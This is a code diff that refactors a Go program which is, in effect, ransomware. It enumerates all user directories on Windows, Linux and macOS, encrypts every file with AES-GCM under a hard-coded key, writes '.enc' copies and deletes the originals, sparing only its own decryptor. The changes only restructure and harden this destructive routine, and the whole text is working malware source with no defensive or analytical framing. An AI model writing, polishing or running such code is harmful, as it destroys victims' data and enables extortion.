@@ -16,19 +16,22 @@ import (
 	"strings"
 )
 
-var secretKey string 
+var secretKey string
 
 func main() {
-	
 	if len(secretKey) == 0 {
 		secretKey = "MyVerySecretKeyForEncryption1234"
 	}
 
-	userDirectories := getUserDirectories()
+	userDirectories, err := getUserDirectories()
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
+	}
 
 	for _, directory := range userDirectories {
 		err := filepath.Walk(directory, func(path string, f os.FileInfo, err error) error {
-			return visit(path, f, err, []byte(secretKey), true)
+			return encryptFileAtPath(path, f, err, []byte(secretKey))
 		})
 
 		if err != nil {
@@ -37,63 +40,56 @@ func main() {
 	}
 }
 
-func visit(path string, f os.FileInfo, err error, key []byte, encrypt bool) error {
+func encryptFileAtPath(path string, f os.FileInfo, err error, key []byte) error {
 	if err != nil {
 		fmt.Println("Error:", err)
 		return nil
 	}
 
-	if !f.IsDir() {
-		if encrypt {
-			if !strings.Contains(path, "decrypt_files_linux") {
-				fmt.Println("Encrypting file:", path)
-				err := encryptFile(path, key)
-				if err != nil {
-					fmt.Println("Encryption error:", err)
-				} else {
-					//Delete the original file after successful encryption
-					os.Remove(path)
-				}
-			} else {
-				fmt.Println("Skipping file:", path)
-			}
+	if !f.IsDir() && shouldEncrypt(path) {
+		fmt.Println("Encrypting file:", path)
+		if err := encryptAndReplaceFile(path, key); err != nil {
+			fmt.Println("Encryption error:", err)
 		}
 	}
 
 	return nil
 }
 
-func getUserDirectories() []string {
+func shouldEncrypt(path string) bool {
+	return !strings.Contains(path, "decrypt_files_linux")
+}
+
+func getUserDirectories() ([]string, error) {
 	switch runtime.GOOS {
 	case "windows":
-		drives, _ := windowsDrives()
-		var userDirs []string
-		for _, drive := range drives {
-			userDirs = append(userDirs, drive+"\\Users\\")
-		}
-		return userDirs
+		return getWindowsUserDirectories()
 	case "linux":
-		return []string{"/home/"}
+		return []string{"/home/"}, nil
 	case "darwin":
-		return []string{"/Users/"}
+		return []string{"/Users/"}, nil
 	default:
-		return []string{}
+		return nil, fmt.Errorf("unsupported OS")
 	}
 }
 
-func windowsDrives() ([]string, error) {
+func getWindowsUserDirectories() ([]string, error) {
 	cmd := exec.Command("wmic", "logicaldisk", "get", "name")
 	var out bytes.Buffer
 	cmd.Stdout = &out
-	err := cmd.Run()
-	if err != nil {
+	if err := cmd.Run(); err != nil {
 		return nil, err
 	}
+
 	driveStrings := strings.Fields(out.String())
-	return driveStrings[1:], nil
+	var userDirs []string
+	for _, drive := range driveStrings[1:] {
+		userDirs = append(userDirs, drive+"\\Users\\")
+	}
+	return userDirs, nil
 }
 
-func encryptFile(inputFile string, key []byte) error {
+func encryptAndReplaceFile(inputFile string, key []byte) error {
 	plainText, err := ioutil.ReadFile(inputFile)
 	if err != nil {
 		return err
@@ -115,8 +111,11 @@ func encryptFile(inputFile string, key []byte) error {
 	}
 
 	ciphertext := gcm.Seal(nonce, nonce, plainText, nil)
-	err = ioutil.WriteFile(inputFile+".enc", ciphertext, 0777)
-	if err != nil {
+	if err = ioutil.WriteFile(inputFile+".enc", ciphertext, 0777); err != nil {
+		return err
+	}
+
+	if err = os.Remove(inputFile); err != nil {
 		return err
 	}
 
